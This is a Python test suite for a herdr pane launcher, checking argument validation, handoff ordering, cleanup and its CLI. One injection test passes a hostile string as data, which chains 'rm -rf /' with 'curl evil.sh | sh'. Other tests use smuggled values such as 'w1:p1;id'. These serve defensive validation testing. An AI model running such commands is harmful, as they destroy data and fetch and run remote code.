"""Tests for the herdr launcher mode (#611, epic #667).

Rewritten after the Step-8a cross-model review returned FAIL on the first attempt. The two
findings that shaped this file:

1. **The first attempt was disconnected builders, not a launcher.** `handoff_plan` returned a
   step whose argv was `None`, nothing read the artifacts it named, and no non-test caller
   existed. So the centrepiece here is `TestPerformHandoff`, which drives the WIRED
   `perform_handoff` end to end through an injected runner and injected readers — proving the
   ordered sequence, the abort-at-first-failure behaviour, and that teardown really is last.
2. **Arming `/goal` at birth was falsified.** herdr rejects a control character in a native
   agent argument, and a real condition is multiline. So `build_agent_start_argv` now carries
   NO goal, and `test_agent_start_never_carries_the_goal` pins that; the goal is armed after
   readiness via the proven send-text route.

The regression that would hurt most and show least is a return to `--current`: it resolves
fine interactively and fails only under cron, i.e. only unattended, i.e. only where nobody is
watching. `test_split_never_uses_current` exists for that.
"""
from __future__ import annotations

import json
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent.parent
HOOKS = REPO_ROOT / "hooks"
CLI = HOOKS / "launcher_lib.py"

if str(HOOKS) not in sys.path:
    sys.path.insert(0, str(HOOKS))

import launcher_lib as ll  # noqa: E402


class FakeProc:
    def __init__(self, returncode=0, stdout=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = ""


class Runner:
    """Records every argv it is handed and replays canned responses by command shape."""

    def __init__(self, responses=None, fail_on=None):
        self.calls: list[list[str]] = []
        self.responses = responses or {}
        self.fail_on = fail_on

    def key(self, argv):
        return " ".join(argv[:3])

    def __call__(self, argv, timeout=180):
        assert isinstance(argv, list) and all(isinstance(a, str) for a in argv), \
            "runner must only ever receive a list[str] argv — never a shell string"
        self.calls.append(list(argv))
        k = self.key(argv)
        if self.fail_on and k.startswith(self.fail_on):
            return FakeProc(returncode=1)
        return FakeProc(0, self.responses.get(k, ""))

    def kinds(self):
        return [self.key(a) for a in self.calls]


SPLIT_OK = json.dumps({"result": {"pane_id": "w1:pZZ"}})
PANE_GET_OK = json.dumps({"result": {"pane": {
    "pane_id": "w1:pZZ",
    "agent_session": {"agent": "claude", "kind": "id", "source": "herdr:claude",
                      "value": "sess-new-123"}}}})
REGISTRY_OK = '{"session_id":"sess-new-123","project":"rawgentic"}\n'
GOAL_FIXTURE = REPO_ROOT / "tests" / "fixtures" / "herdr" / "goal_status_transcript.jsonl"
TRANSCRIPT_OK = GOAL_FIXTURE.read_text(encoding="utf-8")


def _predecessor_closed(runner) -> bool:
    """True if the PREDECESSOR pane was closed. On any failed handoff this must stay False —
    the predecessor has to remain alive AND still guarded. Closing the tentative SUCCESSOR is
    correct cleanup and is asserted separately."""
    return any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:p1" for c in runner.calls)


def _handoff(**over):
    kw = dict(
        anchor_pane="w1:p1", cwd=str(REPO_ROOT), project_root=str(REPO_ROOT),
        name="child4", goal_condition="PR open with green CI",
        registry_path="/reg.jsonl", transcript_path_for=lambda s: f"/t/{s}.jsonl",
        read_text=lambda p: REGISTRY_OK if p == "/reg.jsonl" else TRANSCRIPT_OK,
    )
    kw.update(over)
    return kw


# ---------------------------------------------------------------------------
# AC1 — the split, and the flag that must never come back
# ---------------------------------------------------------------------------

def test_split_uses_the_explicit_anchor_pane() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert argv[:3] == ["herdr", "pane", "split"]
    assert argv[argv.index("--pane") + 1] == "w1:p1"


def test_split_never_uses_current() -> None:
    argv = ll.build_split_argv(anchor_pane="w1:p1", cwd=str(REPO_ROOT),
                               project_root=str(REPO_ROOT))
    assert "--current" not in argv


def test_fallback_launch_is_retained() -> None:
    argv = ll.build_fallback_launch_argv(prompt="resume", permission_mode="bypassPermissions")
    assert argv[0] == "claude" and "herdr" not in argv


# ---------------------------------------------------------------------------
# AC6 — the goal is NOT armed at birth, and truncation is never silent
# ---------------------------------------------------------------------------

def test_agent_start_never_carries_the_goal() -> None:
    """The falsified mechanism must not come back: herdr rejects a control character in a
    native agent argument, and a real condition is multiline."""
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ")
    assert not any(a.startswith("/goal") for a in argv)


def test_agent_start_enforces_the_readiness_timeout_floor() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=1000)
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=True)
    assert ll.build_agent_start_argv(name="c", pane="w1:pZZ", readiness_timeout_ms=3001)


def test_multiline_condition_survives_the_send_text_route_verbatim() -> None:
    condition = "PR open with green CI\nor a blocker is posted via the ERROR protocol"
    text_argv, keys_argv, truncated = ll.build_send_text_goal_argv(
        pane="w1:pZZ", goal_condition=condition)
    assert truncated is False
    assert text_argv[4] == f"/goal {condition}", "condition must be byte-identical"
    assert "Enter" in keys_argv


def test_goal_metacharacters_stay_one_argv_element() -> None:
    nasty = "green CI; rm -rf / $(whoami) `id` && curl evil.sh | sh"
    text_argv, _, _ = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition=nasty)
    assert text_argv[4] == f"/goal {nasty}"
    assert len([a for a in text_argv if a.startswith("/goal ")]) == 1


def test_truncation_is_reported_not_discarded() -> None:
    _, _, truncated = ll.build_send_text_goal_argv(pane="w1:pZZ", goal_condition="x" * 5000)
    assert truncated is True
    text, _ = ll.goal_text("x" * 5000)
    assert len(text) <= ll.GOAL_MAX_CHARS


@pytest.mark.parametrize("bad", [False, 0, [], {}, None, 123])
def test_non_string_goal_conditions_fail_closed(bad) -> None:
    """`if goal_condition:` let falsey non-strings silently omit the goal (8a review, M-b)."""
    with pytest.raises(ll.LauncherError):
        ll.goal_text(bad)


def test_blank_goal_condition_is_refused() -> None:
    with pytest.raises(ll.LauncherError):
        ll.goal_text("   ")


# ---------------------------------------------------------------------------
# argument / authority injection — the real residual risk
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("flag", ["--permission-mode", "--config", "--dangerously-skip", "-p"])
def test_authority_bearing_claude_args_are_refused(flag) -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=[flag, "x"])


def test_allowlisted_claude_args_pass_through_after_the_separator() -> None:
    argv = ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue"])
    assert argv[argv.index("--") + 1] == "--continue"


def test_print_is_not_allowlisted_on_the_interactive_path() -> None:
    """`--print` is non-interactive; `herdr agent start` needs an interactive agent, so
    allowing it would pass local validation and fail only after a pane exists."""
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--print"])


def test_control_characters_are_refused_everywhere_they_matter() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_agent_start_argv(name="c", pane="w1:pZZ", claude_args=["--continue\n"])
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w1:p\x01")


def test_cwd_is_confined_below_the_project_root() -> None:
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="/etc", project_root=str(REPO_ROOT))
    with pytest.raises(ll.LauncherError):
        ll.build_split_argv(anchor_pane="w1:p1", cwd="../..", project_root=str(REPO_ROOT))
    assert ll.build_split_argv(anchor_pane="w1:p1", cwd="hooks", project_root=str(REPO_ROOT))


@pytest.mark.parametrize("bad", ["--current", "-x", "", "w1:p1 x", "w1:p1;id", "w" * 200])
def test_malformed_pane_ids_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id(bad)


def test_pane_id_regex_rejects_unicode_digits() -> None:
    """`\\d` admitted `w١:p1`; the charset is explicit now (8a review, Low)."""
    with pytest.raises(ll.LauncherError):
        ll.validate_pane_id("w١:p1")


@pytest.mark.parametrize("bad", ["-evil", "", "a b", "x" * 200, "Child4", "9lives", "has.dot"])
def test_malformed_agent_names_are_refused(bad) -> None:
    with pytest.raises(ll.LauncherError):
        ll.validate_agent_name(bad)


# ---------------------------------------------------------------------------
# mode selection — must not hand out a successor known to be unusable
# ---------------------------------------------------------------------------

@pytest.mark.parametrize("backend,avail,supports,expected", [
    ("herdr", True, True, "herdr"),
    ("herdr", False, True, "single_session"),
    ("herdr", True, False, "single_session"),
    ("tmux", True, True, "pane_less"),
    (None, False, False, "pane_less"),
])
def test_mode_selection_matches_the_driver_lib_contract(backend, avail, supports, expected):
    """A herdr-gated project that cannot get a pane keeps the single-session loop rather than
    launching a pane-less successor that would die at its first build-seat dispatch
    (8a review, M-c; mirrors driver_lib.fresh_session_available)."""
    mode, reason = ll.select_launch_mode(terminal_backend=backend, herdr_available=avail,
                                         launcher_supports_herdr=supports)
    assert mode == expected
    assert reason.strip()


# ---------------------------------------------------------------------------
# AC7 — the readers actually read
# ---------------------------------------------------------------------------

def test_pane_agent_session_is_parsed_from_a_real_shaped_response() -> None:
    assert ll.parse_pane_agent_session(PANE_GET_OK) == "sess-new-123"


@pytest.mark.parametrize("bad", ["", "not json", "{}", json.dumps({"result": {"pane": {}}}),
                                 json.dumps({"result": {"pane": {"agent_session": {}}}})])
def test_absent_agent_session_reads_as_none_not_success(bad) -> None:
    assert ll.parse_pane_agent_session(bad) is None


def test_registry_match_requires_the_new_session_id() -> None:
    assert ll.registry_has_session(REGISTRY_OK, "sess-new-123") is True
    assert ll.registry_has_session(REGISTRY_OK, "sess-old-999") is False
    assert ll.registry_has_session("garbage\n", "sess-new-123") is False


def test_goal_armed_reads_the_REAL_transcript_shape() -> None:
    """The critical regression (#611 Step-11 High 2).

    An earlier revision matched `{"goal_status": {"met": false}}` — a shape this repo
    INVENTED, which its own tests then fed back. Against real output the check always
    returned False, so `goal_armed` could never pass and teardown could never fire. The
    fixture is real-shaped (`attachment.type == "goal_status"`), verified against live
    transcripts, so the invented shape cannot come back unnoticed.
    """
    assert ll.transcript_has_unmet_goal(TRANSCRIPT_OK) is True
    assert "\"attachment\"" in TRANSCRIPT_OK and '"type":"goal_status"' in TRANSCRIPT_OK
    met_only = "\n".join(l for l in TRANSCRIPT_OK.splitlines() if '"met":true' in l)
    assert met_only, "fixture must carry a met:true line to test against"
    assert ll.transcript_has_unmet_goal(met_only) is False, \
        "an already-met goal does not prove the successor is guarded"
    assert ll.transcript_has_unmet_goal("") is False
    assert ll.transcript_has_unmet_goal('{"goal_status":{"met":false}}') is False, \
        "the invented shape must NOT be accepted"


def test_ladder_is_ordered_and_names_on_disk_artifacts() -> None:
    steps = ll.handoff_verification_steps()
    assert [s["step"] for s in steps] == ["spawned", "project_switched", "goal_armed"]
    for s in steps:
        assert s["artifact"].strip()
        assert "pane text" not in s["artifact"].lower()


def test_ladder_aborts_at_the_first_failure() -> None:
    ok, failed, checked = ll.evaluate_verifications(
        {"spawned": True, "project_switched": False, "goal_armed": True})
    assert (ok, failed, checked) == (False, "project_switched",
                                     ["spawned", "project_switched"])


def test_missing_result_is_failure_not_pass() -> None:
    ok, failed, _ = ll.evaluate_verifications({"spawned": True})
    assert ok is False and failed == "project_switched"


def test_teardown_refused_until_every_check_passes() -> None:
    allowed, reason = ll.teardown_allowed({"spawned": True, "project_switched": True,
                                           "goal_armed": False})
    assert allowed is False and "goal_armed" in reason


# ---------------------------------------------------------------------------
# the wired path — this is what the review found missing
# ---------------------------------------------------------------------------

class TestPerformHandoff:
    def test_happy_path_runs_the_full_ordered_sequence(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert out["new_pane"] == "w1:pZZ"
        assert out["session_id"] == "sess-new-123"
        assert out["results"] == {"spawned": True, "project_switched": True,
                                  "goal_armed": True}
        assert r.kinds() == [
            "herdr pane split", "herdr agent start", "herdr agent wait",
            "herdr pane send-text", "herdr pane send-keys", "herdr pane get",
            "herdr pane close",
        ]
        assert out["cleanup"] is None, "nothing to clean up when ownership transferred"

    def test_teardown_is_the_final_call(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.kinds()[-1] == "herdr pane close"
        assert r.kinds().count("herdr pane close") == 1

    def test_goal_is_pasted_only_after_readiness(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        kinds = r.kinds()
        assert kinds.index("herdr agent wait") < kinds.index("herdr pane send-text")

    @pytest.mark.parametrize("fail_at,expected", [
        ("herdr pane split", "split"),
        ("herdr agent start", "agent_start"),
        ("herdr agent wait", "agent_wait"),
        ("herdr pane send-text", "send_text"),
    ])
    def test_a_failed_step_aborts_and_never_tears_down(self, fail_at, expected) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on=fail_at)
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == expected
        assert not _predecessor_closed(r), \
            "the predecessor must stay alive AND guarded when the handoff fails"
        if out["new_pane"]:
            # a pane was created, so it must have been cleaned up; when the SPLIT itself
            # failed there is nothing to clean up and `cleanup` is correctly None
            assert out["cleanup"] and "closed tentative pane" in out["cleanup"], \
                f"{fail_at}: tentative successor leaked"
        else:
            assert out["cleanup"] is None

    def test_unparseable_split_response_aborts(self) -> None:
        r = Runner({"herdr pane split": "not json"})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "split_response_unparseable"
        # no pane id was parsed, so there is nothing to clean up and nothing to retire
        assert not _predecessor_closed(r) and out["cleanup"] is None

    def test_absent_agent_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert not _predecessor_closed(r)

    def test_registry_without_the_new_session_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=lambda p: '{"session_id":"someone-else"}\n' if p == "/reg.jsonl"
            else TRANSCRIPT_OK))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_unarmed_goal_blocks_teardown(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=lambda p: REGISTRY_OK if p == "/reg.jsonl" else ""))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert not _predecessor_closed(r)

    def test_unreadable_artifact_is_a_failure_not_a_pass(self) -> None:
        def boom(path):
            raise OSError("gone")
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=boom))
        assert out["ok"] is False
        assert not _predecessor_closed(r)

    def test_truncation_is_surfaced_on_the_wired_path(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(goal_condition="x" * 5000))
        assert out["truncated"] is True
        note = [s for s in out["steps"] if s["kind"] == "send_text"][0]["note"]
        assert note and "TRUNCATED" in note

    def test_runner_only_ever_receives_argv_lists(self) -> None:
        """The Runner asserts this on every call; this test makes the guarantee explicit."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff())
        assert r.calls and all(isinstance(c, list) for c in r.calls)


# ---------------------------------------------------------------------------
# CLI (black-box via subprocess, per docs/testing.md)
# ---------------------------------------------------------------------------

def _cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run([sys.executable, str(CLI), *args], capture_output=True,
                          text=True, check=False)


def test_cli_absent_capability_flag_does_not_read_as_support() -> None:
    """`store_true` with `default=True` made the flag a no-op (8a review, M-a)."""
    proc = _cli("select-mode", "--terminal-backend", "herdr", "--herdr-available")
    assert proc.returncode == 0, proc.stderr
    assert "single_session" in proc.stdout


def test_cli_with_capability_flag_selects_herdr() -> None:
    proc = _cli("select-mode", "--terminal-backend", "herdr", "--herdr-available",
                "--launcher-herdr")
    assert proc.returncode == 0 and "herdr\t" in proc.stdout


def test_cli_build_split_emits_argv_without_current() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", str(REPO_ROOT),
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 0, proc.stderr
    assert "--current" not in json.loads(proc.stdout)


def test_cli_rejects_cwd_outside_the_project_root() -> None:
    proc = _cli("build-split", "--anchor-pane", "w1:p1", "--cwd", "/etc",
                "--project-root", str(REPO_ROOT))
    assert proc.returncode == 2 and "outside the project root" in proc.stderr


def test_cli_goal_text_reports_truncation() -> None:
    proc = _cli("goal-text", "--condition", "x" * 5000)
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["truncated"] is True


class TestOwnershipDiscipline:
    """#611 Step-11 High 3 / Medium 5: a tentative successor pane must never be leaked, and a
    failed predecessor teardown must not be reported as a successful handoff."""

    def test_every_post_split_failure_closes_the_tentative_pane(self) -> None:
        for fail_at in ("herdr agent start", "herdr agent wait", "herdr pane send-text",
                        "herdr pane send-keys"):
            r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                       fail_on=fail_at)
            out = ll.perform_handoff(runner=r, **_handoff())
            assert out["ok"] is False, fail_at
            assert "cleanup_tentative_pane" in [s["kind"] for s in out["steps"]], \
                f"{fail_at}: tentative pane leaked"
            closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
            assert closed and closed[0][3] == "w1:pZZ", f"{fail_at}: wrong pane closed"
            assert not any(c[3] == "w1:p1" for c in closed), \
                f"{fail_at}: predecessor must never be closed on a failed handoff"

    def test_failed_verification_also_closes_the_tentative_pane(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK,
                    "herdr pane get": json.dumps({"result": {"pane": {}}})})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "spawned"
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]

    def test_happy_path_does_not_close_the_successor(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True
        assert out["cleanup"] is None
        closed = [c for c in r.calls if c[:3] == ["herdr", "pane", "close"]]
        assert [c[3] for c in closed] == ["w1:p1"], "only the predecessor is retired"

    def test_a_failed_predecessor_teardown_is_not_reported_as_success(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on="herdr pane close")
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == "teardown_predecessor"

    def test_bad_arguments_never_create_a_pane(self) -> None:
        """Validation happens before the split, so a refusal cannot leak a pane."""
        for over in ({"name": "-evil"}, {"goal_condition": "  "},
                     {"readiness_timeout_ms": 1000}, {"claude_args": ["--permission-mode"]}):
            r = Runner({"herdr pane split": SPLIT_OK})
            with pytest.raises(ll.LauncherError):
                ll.perform_handoff(runner=r, **_handoff(**over))
            assert r.calls == [], f"{over}: a command ran before validation failed"

    def test_a_runner_exception_after_the_split_still_cleans_up(self) -> None:
        calls = []

        def boom(argv, timeout=180):
            calls.append(argv)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "pane", "close"]:
                return FakeProc(0)
            raise subprocess.SubprocessError("herdr died")

        out = ll.perform_handoff(runner=boom, **_handoff())
        assert out["ok"] is False
        assert any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:pZZ" for c in calls)
